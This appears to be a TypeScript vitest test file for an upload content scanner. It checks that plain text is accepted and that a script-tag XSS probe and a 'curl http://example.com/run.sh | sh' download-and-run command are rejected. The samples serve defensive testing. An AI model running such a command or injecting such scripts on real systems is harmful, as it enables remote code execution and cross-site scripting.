/**
 * @notice `upload-content-scan` 模块测试。
 * @dev 覆盖安全文本放行与危险脚本、命令模式拦截。
 */
import { describe, expect, it } from "vitest";

import { scanTextContent } from "./upload-content-scan";

describe("upload-content-scan", () => {
  it("allows benign text content", () => {
    const result = scanTextContent(Buffer.from("This is a normal document."));

    expect(result.ok).toBe(true);
  });

  it("rejects script tags", () => {
    const result = scanTextContent(Buffer.from("<script>alert(1)</script>"));

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.ruleId).toBe("script-tag");
    }
  });

  it("rejects shell download commands", () => {
    const result = scanTextContent(Buffer.from("curl http://example.com/run.sh | sh"));

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.ruleId).toBe("shell-download");
    }
  });
});
